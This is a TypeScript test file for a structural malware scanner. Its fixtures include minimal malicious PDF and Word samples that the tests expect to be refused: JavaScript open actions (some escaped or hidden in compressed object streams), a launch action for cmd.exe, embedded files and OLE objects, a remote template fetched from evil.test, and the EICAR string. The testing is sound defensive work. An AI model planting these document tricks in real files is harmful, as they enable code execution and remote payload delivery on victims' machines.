import { deflateSync } from "node:zlib";
import { afterEach, describe, expect, it } from "vitest";
import { ZipWriter } from "@/lib/export/zip";
import { getScanner } from "@/lib/security/malware-scan";
import { StructuralScanner } from "@/lib/security/structural-scan";

// The scanner production runs without an engine (Q286). Each refusal has a
// control that differs only in the active part, so a pass is not a fixture gap.

const scan = (b: Uint8Array) => new StructuralScanner().scan({ bytes: b });
const latin1 = (s: string) => Uint8Array.from(Buffer.from(s, "latin1"));

function pdf(...objects: (string | Buffer)[]): Uint8Array {
  const parts: Buffer[] = [Buffer.from("%PDF-1.7\n", "latin1")];
  objects.forEach((o, i) => {
    parts.push(Buffer.from(`${i + 1} 0 obj\n`, "latin1"), typeof o === "string" ? Buffer.from(o, "latin1") : o,
      Buffer.from("\nendobj\n", "latin1"));
  });
  parts.push(Buffer.from("trailer\n<< /Root 1 0 R >>\n%%EOF\n", "latin1"));
  return Uint8Array.from(Buffer.concat(parts));
}

function stream(dict: string, body: Buffer): Buffer {
  return Buffer.concat([Buffer.from(`<< ${dict} /Length ${body.length} >>\nstream\n`, "latin1"), body,
    Buffer.from("\nendstream", "latin1")]);
}

const CATALOG = "<< /Type /Catalog /Pages 2 0 R >>";

function docx(more: Record<string, string> = {}): Uint8Array {
  const w = new ZipWriter(64 * 1024 * 1024);
  const parts: Record<string, string> = {
    "[Content_Types].xml": "<Types/>",
    "_rels/.rels": "<Relationships/>",
    "word/document.xml": "<document/>",
    ...more,
  };
  for (const [name, body] of Object.entries(parts)) w.addEntry(name, Buffer.from(body, "utf8"));
  return Uint8Array.from(w.finish());
}

const rels = (rel: string) => `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${rel}</Relationships>`;
const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

describe("StructuralScanner: PDF", () => {
  it("passes a plain PDF (control)", async () => {
    expect(await scan(pdf(CATALOG, stream("/Filter /FlateDecode", deflateSync("BT /F1 12 Tf (Hello) Tj ET"))))).toBe("clean");
  });
  it("refuses JavaScript in the raw bytes", async () => {
    expect(await scan(pdf("<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>"))).toBe("infected");
  });
  it("refuses a #xx-escaped name", async () => {
    expect(await scan(pdf("<< /Type /Catalog /OpenAction << /S /J#61vaScript >> >>"))).toBe("infected");
  });
  it("refuses JavaScript hidden in a Flate object stream", async () => {
    expect(await scan(pdf(CATALOG, stream("/Type /ObjStm /Filter /FlateDecode", deflateSync("<< /S /JavaScript /JS (x) >>"))))).toBe("infected");
  });
  it("refuses launch actions and embedded files", async () => {
    expect(await scan(pdf("<< /S /Launch /F (cmd.exe) >>"))).toBe("infected");
    expect(await scan(pdf("<< /Type /Catalog /Names << /EmbeddedFiles 3 0 R >> >>"))).toBe("infected");
  });
  it("reads an ASCII85-then-Flate object stream (ReportLab's chain)", async () => {
    const a85 = (b: Buffer) => {
      let out = "";
      for (let i = 0; i < b.length; i += 4) {
        const chunk = b.subarray(i, i + 4); const pad = 4 - chunk.length;
        let n = Buffer.concat([chunk, Buffer.alloc(pad)]).readUInt32BE(0); const cs: string[] = [];
        for (let k = 0; k < 5; k++) { cs.unshift(String.fromCharCode((n % 85) + 33)); n = Math.floor(n / 85); }
        out += cs.join("").slice(0, 5 - pad);
      }
      return Buffer.from(out + "~>", "latin1");
    };
    const dict = "/Type /ObjStm /Filter [ /ASCII85Decode /FlateDecode ]";
    expect(await scan(pdf(CATALOG, stream(dict, a85(deflateSync("<< /S /JavaScript >>")))))).toBe("infected");
    expect(await scan(pdf(CATALOG, stream(dict, a85(deflateSync("<< /Type /Page >>")))))).toBe("clean");
  });
  it("refuses an object stream in a filter it cannot read", async () => {
    expect(await scan(pdf(CATALOG, stream("/Type /ObjStm /Filter /LZWDecode", Buffer.from("x"))))).toBe("error");
  });
  it("ignores action names that occur by chance inside font or page bytes (control)", async () => {
    expect(await scan(pdf(CATALOG, stream("/Length1 9 /Filter /FlateDecode", deflateSync(Buffer.from([0, 0x2f, 0x4a, 0x53, 1, 0x2f, 0x41, 0x41, 2])))))).toBe("clean");
  });
  it("skips image streams, whose bytes are pixels (control)", async () => {
    expect(await scan(pdf(CATALOG, stream("/Subtype /Image /Filter /DCTDecode", Buffer.from([0xff, 0xd8, 0xff, 0xd9]))))).toBe("clean");
  });
  it("fails closed on a Flate stream it cannot inflate", async () => {
    expect(await scan(pdf(CATALOG, stream("/Type /ObjStm /Filter /FlateDecode", Buffer.from("not deflate data"))))).toBe("error");
  });
  it("does not read /JSON or /AAPL as an active name (control)", async () => {
    expect(await scan(pdf("<< /Type /Catalog /JSON 1 /AAPL 2 >>"))).toBe("clean");
  });
});

describe("StructuralScanner: Office (OOXML)", () => {
  it("passes a plain docx, external hyperlinks included (control)", async () => {
    expect(await scan(docx({
      "word/_rels/document.xml.rels": rels(`<Relationship Id="r1" Type="${REL}/hyperlink" Target="https://example.com" TargetMode="External"/>`),
    }))).toBe("clean");
  });
  it("refuses an external template (the remote-template trick)", async () => {
    expect(await scan(docx({
      "word/_rels/settings.xml.rels": rels(`<Relationship Id="r1" Type="${REL}/attachedTemplate" Target="https://evil.test/t.dotm" TargetMode="External"/>`),
    }))).toBe("infected");
  });
  it("refuses an embedded OLE object", async () => {
    expect(await scan(docx({ "word/embeddings/oleObject1.bin": "OLE" }))).toBe("infected");
  });
  it("passes an embedded workbook, which is an OOXML part, not OLE (control)", async () => {
    expect(await scan(docx({ "word/embeddings/Microsoft_Excel_Worksheet.xlsx": "PK" }))).toBe("clean");
  });
});

describe("StructuralScanner: everything else", () => {
  it("flags the EICAR test file so quarantine stays provable", async () => {
    expect(await scan(latin1("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-" + "ANTIVIRUS-TEST-FILE!$H+H*"))).toBe("infected");
  });
  it("passes an image or text file", async () => {
    expect(await scan(Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))).toBe("clean");
    expect(await scan(latin1("name,amount\nA,1\n"))).toBe("clean");
  });
});

describe("getScanner selects it", () => {
  const original = process.env.MALWARE_SCANNER;
  afterEach(() => {
    if (original === undefined) delete process.env.MALWARE_SCANNER;
    else process.env.MALWARE_SCANNER = original;
  });
  it("MALWARE_SCANNER=structural", () => {
    process.env.MALWARE_SCANNER = "structural";
    expect(getScanner()).toBeInstanceOf(StructuralScanner);
  });
});
